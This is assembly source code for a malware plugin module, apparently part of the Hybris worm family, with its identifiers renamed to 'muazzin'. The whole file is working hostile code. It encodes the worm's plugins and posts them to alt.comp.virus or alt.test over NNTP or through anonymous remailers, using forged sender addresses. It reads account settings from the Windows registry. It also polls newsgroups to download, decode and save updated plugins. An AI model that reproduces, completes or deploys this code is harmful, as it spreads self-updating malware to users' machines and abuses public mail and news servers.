;muazzin reproduction - default muazzin

BITS 32

%include "\muazzin\muazzin.asi"
%include "\muazzin\samples\socket.inc"
%include "\inc\reg.inc"

;%define DEBUG 1

%define NNTP -2
%define SMTP -3

TYPE    EQU "news"
VERSION EQU 0500h

RECV_BUFFER EQU 800h

entry:
       mov esi, [esp+4]
       test dword [esi+m_why], MT_BREED         ;to a lunar event...
       jnz near sendmuazzins                    ;... a lunar event effect
       test dword [esi+m_why], MT_BLOOM
       jnz near getmuazzins
       test dword [esi+m_why], MT_QUERY
       jnz query
       mov dword [esi+m_result], MR_DONE
       ret 4

  query:
       mov esi, MT_QUERY+MT_BLOOM+MT_BREED
       mov ebx, TYPE
       mov ecx, VERSION
       mov eax, MR_DONE
       ret 4

delta:
       call .delta1
  .delta1:
       pop ebp
       sub ebp, .delta1
       ret

byebye:
       pop esi
       mov edi, esp
       push byte 6
       push edi
       mov eax, "quit"
       stosd
       mov eax, 0a0d0a0dh
       stosd
       call safesend                    ;disconect
       jmp esi

dllinit:
       call delta
       pushad
       mov eax, [esi+m_muazzin]
       mov [ebp+mtable], eax
       mov eax, [esi+m_iroutine]
       mov [ebp+mcall], eax
       mov eax, [esi+GPA]
       mov [ebp+getpaddr], eax
       mov eax, [esi+GMH]
       mov [ebp+getmhnd], eax
       lea esi, [ebp+import_table]
  next_dll:
       lodsd
       test eax, eax
       jz all_import
       push esi
       stc
       sbb ebx, ebx
       lea esi, [eax+ebp]
       push esi
       call [ebp+getmhnd]
       test eax, eax
       jnz dll_in_mem
       push esi
       call [ebp+LoadLibraryA]
       mov ebx, eax
  dll_in_mem:
       xchg ebx, eax                            ;ebx==module handle
       mov ecx, [esp]
       mov [ecx-4], eax                         ;-1==no unload dll
  skip_dllname:
       lodsb
       test al, al
       jnz skip_dllname
  next_import:
       lodsd
       test eax, eax
       jz dll_done
       add eax, ebp
       push eax
       push ebx
       call [ebp+getpaddr]
       mov [esi-4], eax
       jmp next_import
  dll_done:
       pop esi
       jmp next_dll
  all_import:
       call [ebp+GetTickCount]
       mov [ebp+seed], eax

       lea edi, [ebp+sender]
       call rnd_name
       mov al,"@"
       stosb
       call rnd_domain
       mov al,"."
       stosb
       call rnd_suffix
       sub eax, eax
       stosd

       lea edi, [ebp+remailer]
       call rnd_server
       sub eax, eax
       stosd

       lea edi, [ebp+from_copy]
       lea esi, [ebp+sender]
       call zopy

       lea edi, [ebp+rcpt_copy]
       lea esi, [ebp+remailer]
       call zopy

       lea esi, [ebp+mail3]
       call count
       mov [ebp+rcpt_size], ecx

       lea esi, [ebp+mail2]
       call count
       mov [ebp+from_size], ecx

       popad
       ret
  count:
       sub ecx,ecx
  count1:
       lodsb
       test al, al
       jz countdone
       inc ecx
       jmp count1
  countdone:
       ret
  zopy:
       call copy
       mov eax, 000a0d00h
       mov al, ">"
       stosd
       ret

sendmuazzins:
       call dllinit
       pushad
       call set_default            ;post goes to alt.test or alt.comp.virus??
  noinet:
       call CheckInet
       jnc inet
%ifdef DEBUG
       push dword 15*1000
%else
       push dword 15*60*1000
%endif
       call [ebp+Sleep]
       jmp noinet

  inet:
       push byte 32
       sub ebx, ebx
       mov esi, 12345678h
  mtable equ $-4
       pop ecx
  try_next:
       mov eax, [esi+menum_kind]
       test eax, eax
       je empty_slot
       test eax, MS_SENT                        ;already sent?
       jne empty_slot
       mov eax, [esi+menum_version]
       cmp ah, 0                                ;version >100
       jne share
  empty_slot:
       add esi, menum_sizeof
       loop try_next
  giveup1:
       jmp giveup

  share:
       or dword [esi+menum_kind], MS_SENT
       mov [ebp+entry_muazzin], esi             ;need to form subject
       sub cl, 32
       neg cl
       sub esp, 100h
       push esp
       call [ebp+mcall]
       mov edx, esp
       push ebx
       push dword 80h
       push byte 3                   ;open existing
       push ebx
       push byte 1h
       push dword 80000000h             ;GENERIC_READ
       push edx
       call [ebp+CreateFileA]
       add esp, 100h
       mov ebx, eax
       inc eax
       jz near noinet
       push ebx
       push dword 64*1024
       push byte 40h
       call [ebp+GlobalAlloc]
       mov [ebp+buffer_muazzin], eax
       mov edi, eax
       test eax, eax
       jz mem_error
       sub eax, eax
       push eax
       push esp
       xchg eax, [esp]
       push eax
       push dword 64*1024
       push edi
       push ebx
       call [ebp+ReadFile]
       pop eax
       mov [ebp+size_muazzin], eax
  mem_error:
       call [ebp+CloseHandle]
       test edi, edi
       jz near noinet

       sub esp, WSAdata_size
       push esp
       push dword 0101h
       call [ebp+WSAStartup]
       sub esp, -WSAdata_size
       push byte IPPROTO_IP
       push byte SOCK_STREAM
       push byte AF_INET
       call [ebp+socket]
       mov ebx, eax
       inc eax
       jz near endinet
       push ebx

       call retrieve_nntp             ;get nntp server in EDX
       test edx, edx
       jz near mail2news

       sub eax, eax
       push eax
       push eax
       push edx
       push dword 77000002h             ;port 119
       mov eax, esp
       push byte sockaddr_in_size
       push eax
       push ebx
       call [ebp+connect]
       sub esp, -(sockaddr_in_size)
       test eax, eax
       jnz mail2news

       sub esp, 200h                            ;ebx=socket
       mov edi, esp

       push dword 200h
       push edi
       call saferecv                            ;get info server

       push byte 6
       push edi
       mov eax, "post"
       stosd
       mov eax, 0a0d0a0dh
       stosd
       call safesend
       push dword 200h
       push edi
       call saferecv
       cmp byte [edi], "3"
       jne m2n

       mov dword [ebp+send_type],NNTP
       jmp header_done

  m2n:
       call byebye
       sub esp, -200h

  mail2news:
       mov dword [ebp+patchpoint], distance4

       mov dword [ebp+send_type],SMTP
       lea eax, [ebp+key]
       push eax
       call retrieve_server             ;get smtp server in EDX
       test edx, edx
       jnz was_saved

  first_retry:
       mov dword [ebp+patchpoint], distance2
       lea esi, [ebp+remailer]
  skip_at:
       lodsb
       cmp al, "@"
       jne skip_at
  retry0:
       push esi
       call [ebp+gethostbyname]
       jmp calc_ip

  retry1:
       mov dword [ebp+patchpoint], distance3
       lea edi, [ebp+subject_buffer]
       mov eax, "smtp"
       stosd
       mov al, "."
       stosb
       call copy
       sub eax, eax
       stosd
       lea esi, [ebp+subject_buffer]
       jmp retry0

  retry2:
       mov dword [ebp+patchpoint], distance1
       mov dword [esi], "mail"
       jmp retry0

  calc_ip:
       test eax,eax
       jnz .cont
       dec eax
       jmp error_ip
  .cont:
       mov eax, [eax+hostentStru.h_list]
       mov eax, [eax]
       mov edx, [eax]

  was_saved:
       sub eax, eax
       push eax
       push eax
       push edx                         ;smtp server
       push dword 19000002h             ;port 25 AF_INET
       mov eax, esp
       push byte sockaddr_in_size
       push eax
       push ebx
       call [ebp+connect]
       sub esp, -(sockaddr_in_size)

  error_ip:
       test eax, eax
patchpoint equ $+2
       jnz near cantconnect
distance0:

       sub esp, 200h                            ;ebx=socket
       mov edi, esp                             ;edi=buffer
       push dword 200h
       push edi
       call saferecv                            ;get info server

       push byte mail4_size
       lea eax, [ebp+mail4]
       push eax

       push dword 12345678h
  rcpt_size equ $-4
       lea eax, [ebp+mail3]
       push eax

       push dword 12345678h
  from_size equ $-4
       lea eax, [ebp+mail2]
       push eax

       push byte mail1_size
       lea eax, [ebp+mail1]
       push eax

       push byte mail0_size
       lea eax, [ebp+mail0]
       push eax

  next_header:
       call safesend
       push dword 200h
       push edi
       call saferecv
       xchg ecx, eax
       jecxz error
       inc ecx
       jecxz error
       cmp edi, esp
       je header_done
       cmp byte [edi], "2"
       je next_header
  error:
       mov esp, edi
       jmp email_error

 header_done:
       mov edi, esp
       mov eax, "From"
       stosd
       mov ax, ": "
       stosw
       lea esi, [ebp+sender]
       call copy
       mov ax, 0a0dh
       stosw

       cmp dword [ebp+send_type],SMTP
       jne .no_email
       mov eax, "To: "
       stosd
       lea esi, [ebp+remailer]
       call copy
       mov ax, 0a0dh
       stosw

  .no_email:
       mov eax, "Subj"
       stosd
       sub eax, "Subj"-"ect:"
       stosd
       sub al, "e"-" "
       stosb
       mov dl, al

       mov esi, edi
       mov ecx, 12345678h
  entry_muazzin equ $-4
       mov eax, [ecx+menum_type]
       stosd
       mov al, dl
       stosb
       mov eax, [ecx+menum_version]
       stosd
       mov al, dl
       stosb

       push byte 40
       call rnd
       lea ecx, [eax+8]                         ;847
       mov edx, edi
       push byte 26-9
       call rnd
       lea eax, [eax+"A"]
       stosb
       push byte 26-9
       call rnd
       lea eax, [eax+"A"]
       stosb
  subject_loop:
       push byte 26
       call rnd
       lea eax, [eax+"A"]
       jc up
       or al, 20h
  up:
       stosb                                    ;build subject
       loop subject_loop

       movzx eax, word [edx]                ;the key are the 2 first letters
       add word [edx-5], ax                 ;of garbage in Subject
       add word [edx-3], ax                 ;encode version
       mov [ebp+key_muazzin], eax
       sub eax, eax
       stosd

       call validate_string
       or eax, 000a0d00h
       mov [edi-4], eax
       dec edi

       mov eax, esp
       xchg eax, edi                            ;edi=start of buffer
       sub eax, esp                             ;eax=size
       push eax
       push edi
       call safesend

       cmp dword [ebp+send_type],SMTP
       je anonp
       lea esi, [ebp+newsgroup]
       mov eax, "News"
       stosd
       movsd
       movsb
       mov ax, "s:"
       stosw
       jmp skipanon

  anonp:
       lea esi, [ebp+anonpost]
       mov ecx, anonpost_size
       rep movsb
       lea esi, [ebp+newsgroup2]

  skipanon:
       mov ecx, dword [ebp+newsgroup_size2]
       rep movsb
       sub edi, esp
       push esp
       xchg edi, [esp]
       push edi
       call safesend

       push dword "AA"
  key_muazzin equ $-4
       push dword 12345678h
  buffer_muazzin equ $-4
       push dword 12345678h
  size_muazzin equ $-4
       mov esi, [esp+4]
       mov edi, [esp]
       add edi, esi
       push edi
       call muazzin2txt
       push eax
       push edi
       call safesend                    ;send muazzin and

       call byebye
       mov dword [ebp+patch+1], 090909090h
       mov byte [ebp+patch], 090h
  email_error:
       sub esp, -200h
  cantconnect:
       call [ebp+closesocket]
  endinet:
       call [ebp+WSACleanup]
  patch:
       jmp noinet
       push dword [ebp+buffer_muazzin]
       call [ebp+GlobalFree]
  giveup:
       call dllfree
       popad
       mov dword [esi+m_result], MR_OK
       ret 4

dllfree:
       pushad
       lea esi, [ebp+import_table]
  next_unload:
       lodsd
       test eax, eax
       jz all_unload
       inc eax
       jz next_unload
       dec eax
       push eax
       call [ebp+FreeLibrary]
       jmp next_unload
  all_unload:
       popad
       ret

safesend:
       pushad
  again:
       push byte 0
       push dword [esp+(8*4)+8+4]
       push dword [esp+(8*4)+4+8]
       push ebx
       call [ebp+send]
       xchg eax, ecx
       jecxz set_eax
       inc ecx
       jnz no_error
       call [ebp+WSAGetLastError]
       sub eax, EWOULDBLOCK
       jz again
       sub ecx, ecx
  no_error:
       dec ecx
  set_eax:
       mov [esp+7*4], ecx
       popad
       ret 8

saferecv:
       pushad
  again333:
       push byte 0
       push dword [esp+(8*4)+8+4]
       push dword [esp+(8*4)+4+8]
       push ebx
       call [ebp+recv]
       xchg eax, ecx
       jecxz set_eax333
       inc ecx
       jnz no_error333
       call [ebp+WSAGetLastError]
       sub eax, EWOULDBLOCK
       jz again333
       sub ecx, ecx
  no_error333:
       dec ecx
  set_eax333:
       mov [esp+7*4], ecx
       popad
       ret 8

;encode seed
;input
;size
;output
muazzin2txt:
       pushad
       mov edi, [esp+(8*4)+4]
       mov ecx, [esp+(8*4)+8]
       mov esi, [esp+(8*4)+12]
       mov ebx, [esp+(8*4)+16]
       sub edx, edx
       mov eax, 0a0dh
       stosw
  .next_char:
       push ecx
       inc edx
       lodsb
       mov ah, al
       and al, 000001111b
       and ah, 011110000b
       shr ah, 4
       add ax, bx
       cmp al, "Z"
       jbe .ok_al
       sub al, "Z"-"A"
  .ok_al:
       cmp ah, "Z"
       jbe .ok_ah
       sub ah, "Z"-"A"
  .ok_ah:
       stosw
       call randcode
       cmp dl, 32
       jbe .no_line
       mov ax, 0a0dh
       stosw
       sub edx, edx
  .no_line:
       pop ecx
       loop .next_char
       mov eax, 0a0d0a0dh
       stosd
       push eax
       add eax, "****"-0a0d0a0dh
       stosd
       pop eax
       stosd
       sub edi, [esp+(8*4)+4]
       mov [esp+7*4], edi
       popad
       ret 16

;key
;in
;out
;size
txt2muazzin:
       pushad
       mov ecx, [esp+(8*4)+4]
       mov edi, [esp+(8*4)+8]
       mov esi, [esp+(8*4)+12]
       mov ebx, [esp+(8*4)+16]
       push edi
       sub edx, edx
  main_loop:
       cmp dword [esi], "****"
       je done
       lodsb
       cmp al, "z"
       ja skip
       cmp al, "a"
       jb skip2
       and al, 0dfh
  skip2:
       cmp al, "A"
       jb skip
       cmp al, "Z"
       ja skip
       cmp dl, 0
       jne decrypt
       mov dl, al
       jmp skip
  decrypt:
       mov dh, al
       sub dl, bl
       jnc nofix1
       add dl, "Z"-"A"
  nofix1:
       sub dh, bh
       jnc nofix2
       add dh, "Z"-"A"
  nofix2:
       shl dh, 4
       or dl, dh
       sub eax, eax
       xchg eax, edx
       stosb
  skip:
       loop main_loop
  done:
       pop eax
       sub edi, eax
       mov [esp+7*4], edi
       popad
       ret 16

retrieve_nntp:
       lea eax, [ebp+key2]
       push eax
       call retrieve_server
       test edx, edx
       jnz near done987
       pushad
       push edx
       push esp
       push byte KEY_QUERY_VALUE
       push edx
       call inetacc
       db "Software\Microsoft\Internet Account Manager", 0
  inetacc:
       push dword HKEY_CURRENT_USER
       call [ebp+RegOpenKeyExA]
       test eax, eax
       pop esi
       jnz near done9871
       push byte 9
       push esp
       lea eax, [ebp+Account_Index]
       push eax
       push byte 0
       push byte 0
       call defacc
       db "Default News Account", 0
  defacc:
       push esi
       call [ebp+RegQueryValueExA]
       test eax, eax
       pop eax
       jnz close1
       push eax
       push esp
       push byte KEY_QUERY_VALUE         ; account
       push byte 0
       lea eax, [ebp+Account_Key]
       push eax
       push dword HKEY_CURRENT_USER
       call [ebp+RegOpenKeyExA]
       test eax, eax
       pop edi
       jnz close1
       add esp, -400h
       mov eax, esp
       push dword 400h
       push esp
       push eax
       push byte 0
       push byte 0
       call nntpserver
       db "NNTP Server", 0
  nntpserver:
       push edi
       call [ebp+RegQueryValueExA]
       test eax, eax
       pop eax
       jnz close2
       push esp
       call [ebp+gethostbyname]
       test eax, eax
       jz close2
       mov eax, [eax+hostentStru.h_list]
       mov eax, [eax]
       push dword [eax]
       pop dword [esp+400h+(5*4)]
  close2:
       add esp, 400h
       push edi
       call [ebp+RegCloseKey]
  close1:
       push esi
       call [ebp+RegCloseKey]
  done9871:
       popad
  done987:
       test edx, edx
       jnz already
       push eax
       push byte nntp_server_size / 4
       call rnd
       mov edx, [ebp+nntp_server+(eax*4)]
       pop eax
  already:
       ret

retrieve_server:
       sub edx, edx
       pushad
       sub esi, esi
       lea edx, [ebp+reg]
       push esi
       push esp
       push dword KEY_QUERY_VALUE
       push esi
       push edx
       push dword HKEY_CURRENT_USER
       call [ebp+RegOpenKeyExA]
       pop ebx
       test eax, eax
       jnz done543
       push ebx
       push esi
       mov edx, esp
       push byte 4
       push esp
       push edx
       push esi
       push esi
       push dword [esp+(8*4)+(8*4)]
       push ebx
       call [ebp+RegQueryValueExA]
       pop ebx
       pop eax
       mov [esp+(4*6)], eax             ;exit EDX
       call [ebp+RegCloseKey]
  done543:
       popad
       ret 4

rnd:
       pushad
       mov eax, 12345678h
  seed equ $-4
       mov ecx, 41c64e6dh
       mul ecx
       add eax, 3039h
       and eax, 7ffffffh
       call delta
       mov [ebp+seed], eax
       mov ecx, [esp+(8*4)+4]
       jecxz nolimit
       cdq
       div ecx
       xchg eax, edx
  nolimit:
       mov [esp+(7*4)], eax
       popad
       bt eax, 0
       ret 4

validate_string:
       push esi
       push ebx
       sub ebx, ebx
       mov eax, ebx
  loop0:
       lodsb
       test al, al
       jz end
       cmp al, "A"                      ;below A isnt for sure
       jb loop0
       cmp al, "z"                      ;above z isnt for sure
       ja loop0
       cmp al, "a"
       jae lowcase
       cmp al, "Z"
       ja loop0
  lowcase:
       and al, 0dfh
       add al, -"A"
       add ebx, eax
       jmp loop0
  end:
       cmp ebx, "Z"-"A"
       jbe done000
       add ebx, -("Z"-"A")
       jmp end
  done000:
       lea eax, [ebx+"A"]
       pop ebx
       pop esi
       ret

getmuazzins:
       call dllinit
       pushad
  noinet424:
       call CheckInet
       jnc inet444
  noinet4242:
%ifdef DEBUG
       push dword 5*1000
%else
       push dword 5*60*1000
%endif
       call [ebp+Sleep]
       jmp noinet424
  inet444:
       sub esp, WSAdata_size
       push esp
       push dword 0101h
       call [ebp+WSAStartup]
       sub esp, -WSAdata_size
       push byte IPPROTO_IP
       push byte SOCK_STREAM
       push byte AF_INET
       call [ebp+socket]
       mov ebx, eax
       inc eax
       jz near endinet666
       push ebx

       call retrieve_nntp             ;get nntp server in EDX
       test edx, edx
       jnz wassaved
       push byte nntp_server_size / 4
       call rnd
       mov edx, [ebp+nntp_server+(eax*4)]

  wassaved:
       sub eax, eax
       push eax
       push eax
       push edx
       push dword 77000002h
       mov eax, esp
       push byte sockaddr_in_size
       push eax
       push ebx
       call [ebp+connect]
       sub esp, -(sockaddr_in_size)
       test eax, eax
       jnz near cantconnect666

%ifdef DEBUG
       inc byte [ebp+logoutfile-2]
       cmp byte [ebp+logoutfile-2], "9"
       jbe counter_updated
       mov byte [ebp+logoutfile-2], "0"
       inc byte [ebp+logoutfile-3]
       cmp byte [ebp+logoutfile-3], "9"
       jbe counter_updated
       mov byte [ebp+logoutfile-3], "0"
       inc byte [ebp+logoutfile-4]
       cmp byte [ebp+logoutfile-4], "9"
       jbe counter_updated
       mov byte [ebp+logoutfile-4], "0"
  counter_updated:
%endif

       sub esp, 200h                            ;ebx=socket
       mov edi, esp

       push dword 200h
       push edi
       call saferecv                            ;get info server

       lea eax, [ebp+newsgroup]
       push dword [ebp+newsgroup_size]
       push eax
       call safesend

       push dword 200h
       push edi
       call saferecv
       cmp byte [edi], "2"                  ;group selected
       jne near outhere

       push dword 64*1024
       push byte 40h
       call [ebp+GlobalAlloc]
       mov [ebp+mem_handle], eax
       test eax, eax
       jz near outhere

  next_post:
       mov edi, esp
       push byte 6
       push edi
       mov eax, "next"
       stosd
       mov eax, 0a0d0a0dh
       stosd
       call safesend
       push dword 200h
       push edi
       call saferecv
       cmp byte [edi], "2"
       jne near error045                                 ;no more articles?

       push byte 6
       push edi
       mov eax, "head"
       stosd
       mov eax, 0a0d0a0dh
       stosd
       call safesend
       push dword 200h
       push edi
       call saferecv
       cmp byte [edi], "2"
       jne near error045                                 ;no more articles?

       mov edi, dword [ebp+mem_handle]
       push edi
       call recvdata                    ;receive full header
       test eax, eax
       jz next_post

       mov ecx, "Subj"
       mov edx, "ect:"
       xchg eax, ecx
  keep_searching:
       repne scasb
       cmp ecx, 8                              ;edi=subject
       jbe near next_post
       cmp dword [edi-1], eax
       jne keep_searching
       cmp dword [edi+3], edx
       jne keep_searching
       scasd
       scasd

       lea esi, [ebp+subject_buffer]
       xchg esi, edi
  search_subject_end:
       lodsb
       cmp al, 0dh
       je _here
       stosb
       loop search_subject_end
       jmp next_post
  _here:
       sub edx, edx
       mov al, dl
       stosb
       lea esi, [ebp+subject_buffer]
       sub edi, esi
       mov ecx, edi                             ;esi,ecx

%ifdef DEBUG
  log_subject:
       pushad
       sub esp, 100h
       sub ebx, ebx
       push ebx
       push dword 80h
       push byte 4                   ;open always
       push ebx
       push ebx
       push dword 0c0000000h
       call logoutfile
       db "d:\lista000",0
  logoutfile:
       call [ebp+CreateFileA]
       mov ebx, eax
       inc eax
       jz error1121221
       push byte 2
       push byte 0
       push byte 0
       push ebx
       call [ebp+SetFilePointer]
       mov edi, esp
  do1234324:
       lodsb
       stosb
       test al, al
       jnz do1234324
       dec edi
       mov ax, 0a0dh
       stosw
       mov esi, esp
       sub edi, esi
       mov ecx, edi
       push byte 0
       mov eax, esp
       push byte 0
       push eax
       push ecx
       push esi
       push ebx
       call [ebp+WriteFile]
       mov [esp], ebx
       call [ebp+CloseHandle]
  error1121221:
       sub esp, -100h
       popad
%endif

       xchg byte [esi+ecx-2], dl
       call validate_string             ;is one of our posts?
       cmp al, dl
       jnz near next_post

       movzx eax, word [esi+10]
       and ax, 0dfdfh
       mov dword [ebp+m_key], eax
       sub word [esi+5], ax             ;retrieve info from subject
       sub word [esi+7], ax
       mov edx, dword [esi+5]
       mov eax, dword [esi]

       sub edi, edi             ;eax=type
       mov esi, [ebp+mtable]    ;edx=version
       push byte 32
       pop ecx

  vrf_muazzin:
       push ecx

       test edi, edi
       jnz no_empty
       cmp [esi+menum_type], edi
       jne no_empty

  muazzin_update:
       test edi, edi
       jz e44234
       mov dword [edi+menum_type], 0          ;free tmp-alloc slot
  e44234:
       sub cl, 32
       neg cl
       mov [esi+menum_type], ecx
       mov edi, esi                             ;edi=empty muazzin slot
       jmp vrf_next_muazzin

  no_empty:
       cmp [esi+menum_type], eax
       jne vrf_next_muazzin
       cmp [esi+menum_version], edx
       jb muazzin_update

       test edi, edi            ;usenet muazzin is older than installed
       jz zkipzz
       mov dword [edi+menum_type], 0          ;free tmp-alloc slot
  zkipzz:
       jmp next_post

  vrf_next_muazzin:
       add esi, menum_sizeof
       pop ecx
       dec ecx
       jnz vrf_muazzin

  get_muazzin:
       test edi, edi
       jz near next_post

       mov [edi+menum_version], edx
       xchg [edi+menum_type], eax
       mov dword [edi+menum_kind], MS_SENT
       mov [ebp+name_index], eax

       mov edi, esp                          ;get da muazzin
       push byte 6
       push edi
       mov eax, "body"
       stosd
       mov eax, 0a0d0a0dh
       stosd
       call safesend
       push dword 200h
       push edi
       call saferecv
       cmp byte [edi], "2"
       jne near next_post

       push dword [ebp+mem_handle]
       call recvdata
       test eax, eax
       jz near error045

%ifdef DEBUG
       pushad
       call delta
       mov esi, dword [ebp+mem_handle]
       mov edi, eax   ;size
       push byte -1
       call [ebp+MessageBeep]
       sub ebx, ebx
       push ebx
       push dword 80h
       push byte 2
       push ebx
       push ebx
       push dword 0c0000000h
       call logoutfile11
       db "d:\uu_body000",0
  logoutfile11:
       call [ebp+CreateFileA]
       mov ebx, eax
       inc eax
       jz error123
       inc byte [ebp+logoutfile11-2]
       cmp byte [ebp+logoutfile11-2], "9"
       jbe counter_updated1
       mov byte [ebp+logoutfile11-2], "0"
       inc byte [ebp+logoutfile11-3]
       cmp byte [ebp+logoutfile11-3], "9"
       jbe counter_updated1
       mov byte [ebp+logoutfile11-3], "0"
       inc byte [ebp+logoutfile11-4]
       cmp byte [ebp+logoutfile11-4], "9"
       jbe counter_updated1
       mov byte [ebp+logoutfile11-4], "0"
  counter_updated1:
       push byte 0
       mov eax, esp
       push byte 0
       push eax
       push edi
       push esi
       push ebx
       call [ebp+WriteFile]
       mov [esp], ebx
       call [ebp+CloseHandle]
  error123:
       popad
%endif

       push eax
       push eax
       push byte 40h
       call [ebp+GlobalAlloc]
       test eax,eax
       mov edi,eax
       pop eax
       jz near next_post

       push dword 12345678h             ;key
 m_key equ $-4
       push dword [ebp+mem_handle]
       push edi
       push eax                         ;size
       call txt2muazzin

%ifdef DEBUG
       pushad
       mov esi, edi
       mov edi, eax
       call delta
       push byte -1
       call [ebp+MessageBeep]
       sub ebx, ebx
       push ebx
       push dword 80h
       push byte 2
       push ebx
       push ebx
       push dword 0c0000000h
       call a831
       db "d:\muazzin000",0
  a831:
       call [ebp+CreateFileA]
       mov ebx, eax
       inc eax
       jz error_mdump
       inc byte [ebp+831-2]
       cmp byte [ebp+831-2], "9"
       jbe counter_updated123
       mov byte [ebp+831-2], "0"
       inc byte [ebp+831-3]
       cmp byte [ebp+831-3], "9"
       jbe counter_updated123
       mov byte [ebp+831-3], "0"
       inc byte [ebp+831-4]
       cmp byte [ebp+831-4], "9"
       jbe counter_updated123
       mov byte [ebp+831-4], "0"
  counter_updated123:
       push byte 0
       mov eax, esp
       push byte 0
       push eax
       push edi
       push esi
       push ebx
       call [ebp+WriteFile]
       mov [esp], ebx
       call [ebp+CloseHandle]
  error_mdump:
       popad
%endif

       sub esi, esi
       xchg esi, eax
       mov ecx, dword 12345678h
  name_index equ $-4
       push esp
       call [ebp+mcall]                 ;get name to use
       mov edx, esp
       push eax
       push dword 80h
       push byte 2                   ;create always
       push eax
       push eax
       push dword 40000000h             ;GENERIC_WRITE
       push edx
       call [ebp+CreateFileA]
       push ebx
       mov ebx, eax
       inc eax
       jz next_post2
       push byte 0
       mov eax, esp
       push byte 0
       push eax
       push esi
       push edi
       push ebx
       call [ebp+WriteFile]
       mov [esp], ebx
       call [ebp+CloseHandle]
  next_post2:
       push edi
       call [ebp+GlobalFree]
       jmp next_post

  error045:
       push dword 12345678h
  mem_handle equ $-4
       call [ebp+GlobalFree]
  outhere:
       mov edi, esp
       push byte 6
       push edi
       mov eax, "quit"
       stosd
       mov eax, 0a0d0a0dh
       stosd
       call safesend                    ;disconect
       sub esp, -200h
  cantconnect666:
       call [ebp+closesocket]
  endinet666:
       call [ebp+WSACleanup]
       jmp noinet4242


randcode:
       push eax

       push byte 16
       call rnd
       test eax, eax
       jnz .no_garble

       push byte table666_size
       call rnd

       mov al,[table666+eax+ebp]
       cmp al, 'V'
       jne .sto
       mov ax, 0a0dh
       stosw
       jmp .no_garble

  .sto:
       stosb

  .no_garble:
       pop eax
       ret

table666 db " V0123456789 V!@$%&*( )-+_\/.,<>;:[]{} V0123456789V"
table666_size equ $-table666

recvdata:
       pushad
       mov esi, [esp+8*4+4]
       sub edi, edi
  .cont:
       lea eax, [edi+esi]
       push dword 1024
       push eax
       call saferecv
       test eax, eax
       jz .return
       add edi, eax
       inc eax
       jz ._end
       call .searchdot
       jnc .return
       jmp .cont
  ._end:
       sub edi, edi
  .return:
       mov dword [edi+esi], 0
       mov [esp+7*4], edi
       popad
       ret 4
  .searchdot:
       pushad
       mov ecx, edi
       mov edi, esi
       mov eax, 0d2e0a0dh
  .retry:
       repne scasb
       jecxz .error213
       cmp dword [edi-1], eax
       jne .retry
       db 0b0h
  .error213:
       stc
       popad
       ret

%ifdef DEBUG
msgbox:
       pushad
       push byte 0
       call .zkip
       db "DEBUG", 0
  .zkip
       push dword [esp+8*4+3*4]
       push byte 0
       call delta
       call [ebp+MessageBoxA]
       popad
       ret 4
%endif

rnd_server:
       pushad
       lea esi, [ebp+remail]
       push byte REMAILERS
       jmp rnd_name.do_it

rnd_domain:
       pushad
       lea esi, [ebp+domain]
       push byte 7
       jmp rnd_name.do_it

rnd_suffix:
       pushad
       lea esi, [ebp+suffix]
       push byte 8
       jmp rnd_name.do_it

rnd_name:
       pushad
       lea esi, [ebp+usernames]
       push byte 26
  .do_it:
       call rnd
       xchg eax, ecx
       jecxz .cpy_char
  .next_char123:
       lodsb
       test al, al
       jnz .next_char123
       loop .next_char123
  .cpy_char:
       call copy
       mov [esp], edi
       popad
       ret

copy:
       lodsb
       test al, al
       jz .done123
       stosb
       jmp copy
  .done123:
       ret

set_default:
       pushad
       call delta
       push byte 8
       call rnd
       test eax,eax
       jnz .done
       sub dword [ebp+newsgroup_size],byte altnews_diff
       sub dword [ebp+newsgroup_size2],byte altnews_diff
       lea edi,[ebp+newsgroup2]
       lea esi,[ebp+altnewsgroup]
       push byte altnews_size
       pop ecx
       rep movsb
  .done:
       popad
       ret

%include "\muazzin\samples\inet.asi"

suffix db "gov",0
       db "edu",0
       db "com",0
       db "org",0
       db "net",0
       db "uk",0
       db "be",0
       db "ru",0

domain db "microsoft",0
       db "yahoo",0
       db "hotmail",0
       db "mail",0
       db "usa",0
       db "geocities",0
       db "aol",0

usernames db "john",0
          db "smith",0
          db "frank",0
          db "patricia",0
          db "charlie",0
          db "bill",0
          db "kurt",0
          db "selassie",0
          db "jeff",0
          db "gordon",0
          db "jack",0
          db "scott",0
          db "joseph",0
          db "joe",0
          db "thomas",0
          db "paul",0
          db "bob",0
          db "robert",0
          db "haile",0
          db "dick",0
          db "nick",0
          db "linda",0
          db "tally",0
          db "craig",0
          db "adam",0
          db "lee",0

Account_Key   db "Software\Microsoft\Internet Account Manager\Accounts\"
Account_Index db "00000000", 0

reg    db "Software\Microsoft\Windows\CurrentVersion\Controls Folder\Hybris",0
key    db "SMTP Server",0
key2   db "NNTP Server",0

newsgroup  db "group"
  newsgroup2 db " alt.comp.virus",13,10,13,10
newsgroup_end equ $

newsgroup_size2 dd newsgroup_end-newsgroup2
newsgroup_size  dd newsgroup_end-newsgroup

  altnewsgroup db " alt.test",13,10,13,10,0
altnews_size equ $-altnewsgroup
 altnews_diff equ 6

anonpost db "Anon-Post-To:"
anonpost_size equ $-anonpost

mail0  db "helo localhost",13,10
mail0_size equ $-mail0

mail1  db "rset",13,10
mail1_size equ $-mail1

mail2  db "mail from: <"
from_copy:
times 32 db 0

mail3  db "rcpt to: <"
rcpt_copy:
times 48 db 0

mail4  db "data",13,10
mail4_size equ $-mail4

%include "remailer.inc"

nntp_server:
%include "nntp.inc"
nntp_server_size equ $-nntp_server

import_table dd kernel32
             dd advapi32
             dd wsock32
%ifdef DEBUG
             dd user32
%endif
             dd 0

kernel32    db "KERNEL32.DLL", 0
.api001     dd .apiname001
.api002     dd .apiname002
.api003     dd .apiname003
.api004     dd .apiname004
.api005     dd .apiname005
.api006     dd .apiname006
.api007     dd .apiname007
.api008     dd .apiname008
.api009     dd .apiname009
.api010     dd .apiname010
.api011     dd .apiname011
%ifdef DEBUG
.api012     dd .apiname012
%endif
            dd 0
.apiname001 db "LoadLibraryA", 0
.apiname002 db "FreeLibrary", 0
.apiname003 db "CreateFileA", 0
.apiname004 db "CloseHandle", 0
.apiname005 db "ReadFile", 0
.apiname006 db "GlobalAlloc", 0
.apiname007 db "GlobalFree", 0
.apiname008 db "Sleep",0
.apiname009 db "GetSystemTime",0
.apiname010 db "GetTickCount",0
.apiname011 db "WriteFile",0
%ifdef DEBUG
.apiname012 db "SetFilePointer",0
%endif

advapi32    db "ADVAPI32.DLL", 0
.api001     dd .apiname001
.api002     dd .apiname002
.api003     dd .apiname003
            dd 0
